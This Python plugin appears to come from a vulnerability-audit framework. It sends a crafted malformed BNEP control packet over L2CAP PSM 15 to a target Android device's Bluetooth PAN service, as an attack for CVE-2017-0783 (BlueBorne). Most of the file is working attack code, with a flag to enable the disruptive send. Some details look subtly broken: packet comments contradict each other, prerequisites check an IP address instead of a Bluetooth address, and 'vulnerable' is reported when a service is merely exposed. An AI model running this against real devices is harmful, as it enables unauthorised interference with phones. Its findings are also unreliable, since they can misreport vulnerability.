#!/usr/bin/env python3
"""CVE-2017-0783 – BlueBorne Android Bluetooth PAN/BNEP MITM logic flaw.

Public PoC source: https://github.com/hw5773/blueborne
  CVE-2017-0783/ directory (hw5773 / BlueBorne research reproduction)
  Original research: Armis Security / Ben Seri

Attack technique:
  Android Bluetooth PAN (Personal Area Networking) uses BNEP (Bluetooth
  Network Encapsulation Protocol) for tethering.  CVE-2017-0783 allows
  an attacker to inject a crafted BNEP control message that hijacks the
  network session:
    1. Attacker connects to victim's BT PAN service (PSM 15)
    2. Sends malformed BNEP_CONTROL packet with invalid command type
    3. Android's net_bnep driver does not properly validate → logic flaw
    4. Attacker can force MITM position in the network session

  The hw5773/blueborne repo includes test scripts for CVE-2017-0783
  under CVE-2017-0783/ directory.
"""
from __future__ import annotations

import socket
import struct
import subprocess
from pathlib import Path

from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin

VULN = {
    "id": 89,
    "cve": "CVE-2017-0783",
    "year": 2017,
    "domain": "wireless",
    "vendor_product": "Android / AAOS Bluetooth PAN/BNEP",
    "component": "Bluetooth PAN BNEP protocol handler",
    "type": "MITM / logic flaw in BNEP network session",
    "summary": (
        "Malformed BNEP_CONTROL packet injected into an active PAN session "
        "allows attacker to intercept and redirect Bluetooth network traffic, "
        "enabling MITM in the BT tethering/hotspot channel."
    ),
    "source_url": "https://github.com/hw5773/blueborne",
    "requires_manual_review": True,
    "affected": [{"vendor": "Google", "product": "Android (BlueBorne)",
                  "versions": [{"version": "<2017-09 patch", "status": "affected"}]}],
}

POC_REPO = Path(__file__).parent.parent.parent / \
    "public_poc_sources/repos/hw5773__blueborne" / "CVE-2017-0783"

# BNEP protocol constants
BNEP_PSM       = 0x000f  # L2CAP PSM for BNEP/PAN
BNEP_CONTROL   = 0x01    # BNEP Control packet type
BNEP_FILTER_NP = 0x01    # BNEP_SETUP_CONNECTION_REQUEST

# Malformed BNEP_CONTROL: unknown type + max count to trigger logic flaw
def _build_bnep_control_attack() -> bytes:
    """Build crafted BNEP FILTER_NET_TYPE_SET with invalid parameters."""
    bnep_type    = bytes([0x81])              # BNEP_CONTROL bit set + type=0x01
    ctrl_type    = bytes([0xFF])             # Invalid control type (triggers logic flaw)
    ctrl_payload = struct.pack('>H', 0xFFFF) # Large count → logic overflow
    ctrl_payload += b'\xde\xad' * 64        # Extended payload
    return bnep_type + ctrl_type + ctrl_payload


def _probe_bnep_pan(target_bdaddr: str) -> dict:
    """Attempt to connect to BT PAN service and probe BNEP vulnerability."""
    result = {"exposed": False, "bnep_connected": False, "detail": ""}
    try:
        import bluetooth
        # Scan for PAN service on target
        services = bluetooth.find_service(address=target_bdaddr)
        pan_services = [s for s in services
                        if "NAP" in s.get("name", "").upper() or
                           "PAN" in s.get("name", "").upper() or
                           s.get("port") == 15]
        result["exposed"] = len(pan_services) > 0
        result["pan_services"] = [s.get("name", "") for s in pan_services]

        if result["exposed"]:
            # Try L2CAP connection on BNEP PSM
            sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
            sock.settimeout(5)
            sock.connect((target_bdaddr, BNEP_PSM))
            result["bnep_connected"] = True

            # Send malformed BNEP control packet
            pkt = _build_bnep_control_attack()
            sock.send(pkt)
            import time
            time.sleep(0.5)
            try:
                resp = sock.recv(256)
                result["bnep_response"] = resp.hex()
            except Exception:
                result["bnep_response"] = "no response"
            sock.close()
    except ImportError:
        result["detail"] = "pybluez not installed: pip install pybluez2"
    except Exception as exc:
        result["detail"] = str(exc)
    return result


def _run_poc(plugin):
    target   = (plugin.params or {}).get("target_bdaddr", "")
    allow_disruptive = getattr(plugin, "_allow_disruptive", False) or \
        bool((plugin.params or {}).get("allow_disruptive"))

    evidence = {
        "cve": "CVE-2017-0783",
        "poc_repo": str(POC_REPO),
        "poc_present": POC_REPO.exists(),
        "bnep_attack_packet_hex": _build_bnep_control_attack().hex(),
        "attack_technique": "Malformed BNEP_CONTROL on PSM 15 → MITM logic flaw",
    }

    if allow_disruptive and target:
        probe = _probe_bnep_pan(target)
        evidence.update(probe)
    elif not target:
        evidence["detail"] = "Provide target_bdaddr= for BNEP probe."
    else:
        evidence["detail"] = "Set allow_disruptive=true to send BNEP attack packet."

    return {
        "vulnerable": evidence.get("bnep_connected") or evidence.get("exposed"),
        "evidence": evidence,
        "requires_manual_review": True,
        "poc_source": "hw5773/blueborne / CVE-2017-0783 (BlueBorne Armis)",
    }


try:
    import sys as _sys; _sys.path.insert(0, __import__('pathlib').Path(__file__).parent.parent.as_posix())
    from probe_utils import detection_confidence as _dc
    _PROBE_UTILS = True
except ImportError:
    def _dc(level, evidence, **kw): return {'detection_confidence': {'level': level, 'evidence': evidence}}
    _PROBE_UTILS = False

class Poc89CVE20170783BlueborneANepMitmAuditPlugin(IVIVulnerabilityPlugin):
    meta_generated_source = "public_poc_exp_50_more"
    meta_display_id = "POC-WIRELESS-089"
    meta_poc_name   = 'CVE-2017-0783 BlueBorne Android BNEP PAN MITM Active Validation'
    meta_cve_id     = "CVE-2017-0783"
    meta_severity   = "High"
    meta_protocol   = "bluetooth"
    meta_target_os  = ["android"]
    meta_required_params = []
    meta_optional_params = ["target_bdaddr", "allow_disruptive"]
    meta_profiles   = ["wireless"]
    meta_source_url = "https://github.com/hw5773/blueborne"
    meta_references       = ['https://github.com/hw5773/blueborne']
    meta_attack_surface = "Android BT BNEP PAN MITM via invalid control message (BlueBorne)"
    is_disruptive   = True
    meta_destructive_level = "Disruptive"

    def check_prerequisites(self) -> bool:
        """基础前提条件检查。"""
        if not self.target_ip or self.target_ip == "N/A":
            self.logger.error("未指定目标 IP。")
            return False
        return True

    def exploit(self):
        return run_active_validation(self, VULN, probe=_run_poc)

if __name__ == "__main__":
    import argparse, json

    _desc = VULN.get("summary", "89_BlueBorne_BNEP_Android_BT_MITM_Audit") if "VULN" in dir() else "89_BlueBorne_BNEP_Android_BT_MITM_Audit"
    parser = argparse.ArgumentParser(description=_desc)
    parser.add_argument("target_ip", nargs="?", default="127.0.0.1",
                        help="目标 IP 地址")
    parser.add_argument("--port",       default=80, type=int)
    parser.add_argument("--disruptive", action="store_true",
                        help="启用破坏性探针（需操作员授权）")
    args = parser.parse_args()

    _plugin = Poc89CVE20170783BlueborneANepMitmAuditPlugin({
        "target_ip":        args.target_ip,
        "port":             args.port,
        "allow_disruptive": args.disruptive,
    })
    _result = _plugin.run_verify()
    print(json.dumps(_result, indent=2, ensure_ascii=False, default=str))
